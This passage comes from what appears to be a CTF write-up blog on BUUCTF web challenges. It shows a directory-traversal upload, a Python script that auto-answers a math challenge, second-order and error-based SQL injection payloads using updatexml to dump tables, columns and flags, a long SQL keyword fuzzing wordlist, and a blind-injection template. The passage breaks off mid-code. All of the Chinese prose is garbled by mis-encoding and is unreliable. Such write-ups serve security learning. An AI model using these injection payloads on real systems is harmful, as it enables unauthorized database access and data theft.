alt="easycmms2"></p><p>å¦‚æœæƒ³è‡ªå®šä¹‰å°±è¦å»åˆ›å»ºè¿™æ ·ä¸€ä¸ªæ–‡ä»¶ï¼š<code>/var/www/html/system/tmp/xspg.txt</code></p><p>è®¾è®¡ -&gt; ç»„ä»¶ -&gt; ç´ æåº“è¿™é‡Œæ”¯æŒä¸Šä¼ æ–‡ä»¶ï¼š</p><p><img src="/img/easycms3.png" alt="easycms3"></p><p>æ³¨æ„ä»–è¿™ä¸ªå­˜å‚¨è·¯å¾„ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼š</p><p><img src="/img/easycms4.png" alt="easycms4"></p><p>æ–‡ä»¶ä¸ç”¨åŠ åç¼€ï¼Œç›®å½•ç©¿è¶Šå¤šè¯•å‡ æ¬¡å°±è¡Œï¼Œå¦‚æœç›®å½•ä¸å¯¹ä»–è‡ªå·±ä¼šæç¤º<code>fail</code></p><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p><img src="/img/StrongestMind1.png" alt="StrongestMind1"></p><p>æºç æ²¡å•¥æç¤ºï¼Œç›´æ¥æŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img src="/img/StrongestMind2.png" alt="StrongestMind2"></p><p>æŠŠç»“æœæ˜æ–‡ä¼ è¿‡å»çš„ï¼Œ<code>POST answer=xxxx</code></p><p>è„šæœ¬ä¸ä¼šå†™ç›´æ¥æŠ„çš„è¿™ä½å¸ˆå‚…çš„ï¼š<code>https://blog.csdn.net/shinygod/article/details/124141957</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://4dd9922c-9934-46da-83e8-49992b7b6ffd.node4.buuoj.cn:81/&quot;</span><br>session = requests.session()<br>req = session.get(url).text<br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1010</span>):<br>    <span class="hljs-keyword">try</span>:<br>        result = re.findall(<span class="hljs-string">&quot;\&lt;br\&gt;\&lt;br\&gt;(\d.*?)\&lt;br\&gt;\&lt;br\&gt;&quot;</span>,req)<span class="hljs-comment">#è·å–[æ•°å­—]</span><br>        result = <span class="hljs-string">&quot;&quot;</span>.join(result)<span class="hljs-comment">#æå–å­—ç¬¦ä¸²</span><br>        result = <span class="hljs-built_in">eval</span>(result)<span class="hljs-comment">#è¿ç®—</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+ <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&quot;   &quot;</span>+<span class="hljs-string">&quot;result: &quot;</span>+ <span class="hljs-built_in">str</span>(result))<br><br>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span>:result&#125;<br>        req = session.post(url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&#123;&quot;</span> <span class="hljs-keyword">in</span> req:<br>            <span class="hljs-built_in">print</span>(re.search(<span class="hljs-string">&quot;flag&#123;.*&#125;&quot;</span>, req).group(<span class="hljs-number">0</span>)[:<span class="hljs-number">50</span>])<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment">#é˜²æ­¢è®¿é—®å¤ªå¿«æ–­å¼€è¿æ¥</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-]&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/StrongestMind3.png" alt="StrongestMind3"></p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>éšä¾¿æ³¨å†Œäº†ä¸ªè´¦å·ï¼Œå‘ç°è¿™ä¸œè¥¿æœ‰ä¿®æ”¹å¯†ç çš„åŠŸèƒ½ã€‚</p><p><img src="/img/rctf2015zesysql1.png" alt="rctf2015zesysql1"></p><p>åˆæ­¥çŒœæµ‹äºŒæ¬¡æ³¨å…¥ã€‚äºŒæ¬¡æ³¨å…¥è¿™ä¸œè¥¿ä¸ªäººç†è§£å°±æ˜¯åœ¨è·å–ç”¨æˆ·è¾“å…¥çš„è¿‡ç¨‹ä¸­åªç®€å•è®¾ç½®äº†è½¬ä¹‰<code>(æ¯”å¦‚åœ¨å•å¼•å·å‰é¢åŠ ä¸ª\)</code>ï¼Œç„¶åç”¨æˆ·é€šè¿‡æŸä¸ªåŠŸèƒ½å°†æ¶æ„æ•°æ®å–å‡ºå¹¶åˆ©ç”¨ã€‚</p><p><code>admin</code>ç”¨æˆ·ä¸ç»™æ³¨å†Œï¼Œä¼°è®¡æ˜¯è¦ä»¥<code>admin</code>èº«ä»½ç™»å½•ç„¶åæ‹¿<code>flag</code>ã€‚ä¸çŸ¥é“è¿™ä¸ªç”¨æˆ·åæ˜¯æ€ä¹ˆé—­åˆçš„ï¼Œè¾“ä¸ª<code>adminâ€˜#</code>æ³¨å†Œä¸€ä¸‹ï¼š</p><p><img src="/img/rctf2015zesysql2.png" alt="rctf2015zesysql2"></p><p>ç„¶åä¿®æ”¹å¯†ç ï¼Œè¿™æ—¶å¦‚æœå®ƒåç«¯æ”¹å¯†ç çš„é€»è¾‘æ˜¯ç±»ä¼¼è¿™ç§ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$new_pass&#x27;</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$old_pass&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠç”¨æˆ·å<code>admin&#39;#</code>æ”¾è¿›å»ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$new_pass&#x27;</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span>  # <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$old_pass&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å®é™…ä¿®æ”¹çš„æ˜¯<code>admin</code>çš„å¯†ç ã€‚å½“ç„¶è¿™ä¸ªé—­åˆä¸ä¸€å®šæ˜¯å•å¼•å·ï¼Œéœ€è¦è¯•ã€‚</p><p>è¯•åˆ°åŒå¼•å·ç»ˆäºå‡ºäº†ç‚¹ä¸œè¥¿(è¿™é‡Œæˆ‘æ³¨å†Œçš„æ˜¯<code>admin&quot;--+</code>)ï¼š</p><p><img src="/img/rctf2015zesysql3.png" alt="rctf2015zesysql3"></p><p>ä½†æŠ¥é”™äº†ï¼Ÿ</p><p><code>pwd</code>è¿™ä¸ªå­—æ®µå­˜çš„åº”è¯¥æ˜¯æ—§å¯†ç çš„<code>md5(å¯ä»¥è‡ªå·±æ¢ç„¶åçœ‹å›æ˜¾ã€‚)</code>æŠ¥é”™åŸå› ä¼°è®¡å°±æ˜¯ç”¨æˆ·åé—­åˆçš„é—®é¢˜ï¼Œå¯ä»¥æ³¨å†Œä¸€ä¸ª<code>&quot;admin&quot;</code>çœ‹çœ‹ï¼š</p><p><img src="/img/rctf2015zesysql4.png" alt="rctf2015zesysql4"></p><p>æ³¨æ„è¿™ä¸ª<code>admin&quot;&quot;</code>ï¼Œæ‰€ä»¥ç”¨æˆ·åç”¨åŒå¼•å·é—­åˆçš„ã€‚è€Œä¸”å‡ºé”™ä¼šæœ‰å›æ˜¾ï¼Ÿè€ƒè™‘æŠ¥é”™æ³¨å…¥ï¼š</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&quot;&amp;&amp;(updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))#<br>ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨æ‹¬å·æ›¿æ¢<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql5.png" alt="rctf2015zesysql5"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(group_concat(table_name))<span class="hljs-built_in">from</span>(information_schema.tables)<span class="hljs-built_in">where</span>(table_schema=database())),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql6.png" alt="rctf2015zesysql6"></p><p>åé¢å°±ä¸è¯¦ç»†å†™äº†ï¼Œ<code>flag</code>è¡¨ä¸‹æœ‰<code>flag</code>å­—æ®µï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(flag)<span class="hljs-built_in">from</span>(flag)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql7.png" alt="rctf2015zesysql7"></p><p>ä»–ğŸçš„ï¼Œåªèƒ½å†çœ‹åˆ«çš„è¡¨ï¼š<code>user</code></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(group_concat(column_name))<span class="hljs-built_in">from</span>(information_schema.columns)<span class="hljs-built_in">where</span>(table_name=&#x27;user&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql8.png" alt="rctf2015zesysql8"></p><p>æ²¡æ˜¾ç¤ºå®Œå…¨ï¼Œ<code>updatexml</code>è¿™ä¸œè¥¿åªæ˜¾ç¤º32ã€‚å¯ä»¥åˆ©ç”¨<code>reverse</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,reverse((select(group_concat(column_name))<span class="hljs-built_in">from</span>(information_schema.columns)<span class="hljs-built_in">where</span>(table_name=&#x27;user&#x27;))),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql9.png" alt="rctf2015zesysql9"></p><p>???ä»–å¦ˆçš„æˆ‘è¯´æ€ä¹ˆä¸å¯¹æˆ‘æŠŠusersæ‰“æˆuseräº†ï¼Œæˆ‘çœŸå‚»é€¼</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(group_concat(column_name))<span class="hljs-built_in">from</span>(information_schema.columns)<span class="hljs-built_in">where</span>(table_name=&#x27;users&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql10.png" alt="rctf2015zesysql10"></p><p><code>reverse</code>ä¸€ä¸‹çœ‹åé¢æœ‰æ²¡æœ‰ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,reverse((select(group_concat(column_name))<span class="hljs-built_in">from</span>(information_schema.columns)<span class="hljs-built_in">where</span>(table_name=&#x27;users&#x27;))),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql11.png" alt="rctf2015zesysql11"></p><p>è¯»<code>real_flag_1s_here</code>å­—æ®µï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(real_flag_1s_here)<span class="hljs-built_in">from</span>(users)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql12.png" alt="rctf2015zesysql12"></p><p>è¿™ä¸œè¥¿è¿”å›äº†ä¸æ­¢ä¸€è¡Œã€‚ã€‚æ­£åˆ™åŒ¹é…ä¸‹å¸¦æœ‰<code>flag</code>æˆ–<code>RCTF</code>çš„å­—æ®µå°±è¡Œï¼Œæ­£åˆ™çš„è¯­æ³•ç±»ä¼¼è¿™ç§ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Name<br><span class="hljs-keyword">FROM</span> Products<br><span class="hljs-keyword">WHERE</span> Name REGEXP <span class="hljs-string">&#x27;XXXXX&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;<span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,reverse((select(group_concat(real_flag_1s_here))<span class="hljs-built_in">from</span>(users)<span class="hljs-built_in">where</span>(real_flag_1s_here)<span class="hljs-built_in">regexp</span>(&#x27;flag&#x27;))),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p>å»æ‰reverseå†çœ‹ï¼Œç„¶åæ‹¼èµ·æ¥å°±è¡Œã€‚</p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>å”‰ï¼Œå­™ç¬‘å·ï¼Œæ™¦æ°”å•Šã€‚</p><p><img src="/img/GYCTF2020Ezsqli1.png" alt="GYCTF2020Ezsqli1"></p><p>å…ˆçœ‹æ€ä¹ˆé—­åˆçš„<code>1&#39;#</code>ï¼š</p><p><img src="/img/GYCTF2020Ezsqli2.png" alt="GYCTF2020Ezsqli2"></p><p>åˆæ­¥çŒœæµ‹å¸ƒå°”ç›²æ³¨ï¼Œå°è¯•<code>1#</code></p><p><img src="/img/GYCTF2020Ezsqli3.png" alt="GYCTF2020Ezsqli3"></p><p>æ•°å­—å‹æ³¨å…¥</p><p><img src="/img/GYCTF2020Ezsqli5.png" alt="GYCTF2020Ezsqli5"></p><p><code>FUZZ</code>ä¸€ä¸‹çœ‹çœ‹éƒ½è¿‡æ»¤äº†å•¥ï¼š</p><p>æˆ‘ç”¨çš„æ˜¯è¿™ä¸ªå­—å…¸ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹(ç”¨burpsuite FUZZçš„è¯è®°å¾—è®¾ç½®ä¸€ä¸‹é—´éš”ï¼Œä¹Ÿå°±æ˜¯Fixedå‚æ•°)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">length <br>Length<br>+<br><span class="hljs-keyword">handler</span><br><span class="hljs-keyword">like</span><br><span class="hljs-keyword">LiKe</span><br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">SeleCT</span> <br>sleep<br>SLEEp<br><span class="hljs-keyword">database</span><br><span class="hljs-keyword">DATABASe</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">having</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">oR</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">As</span><br>-~<br>BENCHMARK<br><span class="hljs-keyword">limit</span><br><span class="hljs-keyword">LimIt</span><br>left<br>Left<br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">insert</span><br><span class="hljs-keyword">insERT</span><br><span class="hljs-keyword">INSERT</span><br>right<br>#<br><span class="hljs-comment">--+</span><br>INFORMATION<br><span class="hljs-comment">--</span><br>;<br>!<br>%<br>+<br>xor<br>&lt;&gt;<br>(<br>&gt;<br>&lt;<br>)<br>.<br>^<br>=<br><span class="hljs-keyword">AND</span><br><span class="hljs-keyword">ANd</span><br><span class="hljs-keyword">BY</span><br><span class="hljs-keyword">By</span><br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">COLUMN</span><br><span class="hljs-keyword">COlumn</span><br>COUNT<br>Count<br><span class="hljs-keyword">CREATE</span><br><span class="hljs-keyword">END</span><br><span class="hljs-keyword">case</span><br><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">when</span><br><span class="hljs-string">admin&#x27;</span><br>&quot;<br>length <br>+<br>REVERSE<br>ascii<br>ASSIC<br>ASSic<br>select <br>database<br>left<br>right<br>union<br>UNIon<br>UNION<br>&quot;<br>&amp;<br>&amp;&amp;<br>||<br>oorr<br>/<br>//<br>/<span class="hljs-comment">/*</span><br><span class="hljs-comment">*/</span>*<br><span class="hljs-comment">/**/</span><br>anandd<br><span class="hljs-keyword">GROUP</span><br><span class="hljs-keyword">HAVING</span><br><span class="hljs-keyword">IF</span><br><span class="hljs-keyword">INTO</span><br><span class="hljs-keyword">JOIN</span><br>LEAVE<br>LEFT<br><span class="hljs-keyword">LEVEL</span><br>sleep<br><span class="hljs-keyword">LIKE</span><br>NAMES<br>NEXT<br><span class="hljs-keyword">NULL</span><br><span class="hljs-keyword">OF</span><br><span class="hljs-keyword">ON</span><br>|<br>infromation_schema<br><span class="hljs-keyword">user</span><br><span class="hljs-keyword">OR</span><br><span class="hljs-keyword">ORDER</span><br>ORD<br><span class="hljs-keyword">SCHEMA</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">SET</span><br><span class="hljs-keyword">TABLE</span><br><span class="hljs-keyword">THEN</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">USER</span><br><span class="hljs-keyword">USING</span><br><span class="hljs-keyword">VALUE</span><br><span class="hljs-keyword">VALUES</span><br><span class="hljs-keyword">WHEN</span><br><span class="hljs-keyword">WHERE</span><br><span class="hljs-keyword">ADD</span><br><span class="hljs-keyword">AND</span><br><span class="hljs-keyword">prepare</span><br><span class="hljs-keyword">set</span><br><span class="hljs-keyword">update</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">drop</span><br>inset<br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">COLUMN</span><br>CONCAT<br>GROUP_CONCAT<br>group_concat<br><span class="hljs-keyword">CREATE</span><br><span class="hljs-keyword">DATABASE</span><br>DATABASES<br><span class="hljs-keyword">alter</span><br><span class="hljs-keyword">DELETE</span><br><span class="hljs-keyword">DROP</span><br>floor<br>rand()<br>information_schema.<span class="hljs-keyword">tables</span><br>TABLE_SCHEMA<br>%df<br>concat_ws()<br>concat<br><span class="hljs-keyword">LIMIT</span><br>ORD<br><span class="hljs-keyword">ON</span><br>extractvalue<br><span class="hljs-keyword">order</span> <br>CAST()<br><span class="hljs-keyword">by</span><br><span class="hljs-keyword">ORDER</span><br>OUTFILE<br><span class="hljs-keyword">RENAME</span><br>REPLACE<br><span class="hljs-keyword">SCHEMA</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">SET</span><br>updatexml<br><span class="hljs-keyword">SHOW</span><br><span class="hljs-keyword">SQL</span><br><span class="hljs-keyword">TABLE</span><br><span class="hljs-keyword">THEN</span><br><span class="hljs-keyword">TRUE</span><br>instr<br>benchmark<br><span class="hljs-keyword">format</span><br>bin<br>substring<br>ord<br> <br><span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">VALUES</span><br><span class="hljs-type">VARCHAR</span><br><span class="hljs-keyword">VERSION</span><br><span class="hljs-keyword">WHEN</span><br><span class="hljs-keyword">WHERE</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">`</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">,</span><br><span class="hljs-comment">users</span><br><span class="hljs-comment">%0a</span><br><span class="hljs-comment">%0A</span><br><span class="hljs-comment">%0b</span><br><span class="hljs-comment">mid</span><br><span class="hljs-comment">for</span><br><span class="hljs-comment">BEFORE</span><br><span class="hljs-comment">REGEXP</span><br><span class="hljs-comment">RLIKE</span><br><span class="hljs-comment">in</span><br><span class="hljs-comment">sys schemma</span><br><span class="hljs-comment">SEPARATOR</span><br><span class="hljs-comment">XOR</span><br><span class="hljs-comment">CURSOR</span><br><span class="hljs-comment">FLOOR</span><br><span class="hljs-comment">sys.schema_table_statistics_with_buffer</span><br><span class="hljs-comment">INFILE</span><br><span class="hljs-comment">count</span><br><span class="hljs-comment">%0c</span><br><span class="hljs-comment">from</span><br><span class="hljs-comment">%0d</span><br><span class="hljs-comment">%a0</span><br><span class="hljs-comment">=</span><br><span class="hljs-comment">@</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">%27</span><br><span class="hljs-comment">%23</span><br><span class="hljs-comment">%22</span><br><span class="hljs-comment">%20</span><br></code></pre></td></tr></table></figure><p><img src="/img/2020ezsqli1.png" alt="2020ezsqli1"></p><p>ä¸»è¦æ˜¯è¿‡æ»¤äº†<code>information_schema.tables</code>è¿™ä¸œè¥¿ï¼Œä½†æ³¨æ„ï¼š</p><p><img src="/img/2020ezsqli2.png" alt="2020ezsqli2"></p><p><code>sys</code>è¿™ä¸ªæ²¡è¿‡æ»¤ï¼Œè€Œä¸”ç»è¿‡æµ‹è¯•ç›´æ¥æ‰“<code>or</code>æ²¡é—®é¢˜ï¼Œä½†è¿èµ·æ¥æ¯”å¦‚<code>0 or 1=1 #</code>è¿™ç§è¿˜ä¼šè¢«æ£€æµ‹åˆ°ã€‚ã€‚</p><p><code>if</code>,<code>^</code>,<code>&amp;&amp;</code>èƒ½ç”¨ï¼Œæ¯”å¦‚ï¼š</p><p><code>if(1,1,2)</code>è¿™é‡Œä¼šè¿”å›<code>nu1l</code>ï¼Œå¯ä»¥åœ¨ç¬¬ä¸€ä¸ª<code>1</code>ä¸Šåšæ–‡ç« </p><p><code>0^1</code>è¿”å›<code>nu1l</code>ï¼Œ<code>1&amp;&amp;1</code>è¿”å›<code>nu1l</code></p><p>æ‹¿<code>if</code>æ¥è¯´ï¼Œçˆ†åº“å¯ä»¥ä½¿ç”¨ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">if</span>(<span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substr</span>(<span class="hljs-built_in">database</span>(),&#123;&#125;,<span class="hljs-number">1</span>))&gt;&#123;&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-selector-class">.format</span>&#123;<span class="hljs-selector-tag">i</span>,<span class="hljs-selector-tag">j</span>&#125;<br></code></pre></td></tr></table></figure><p>å³</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 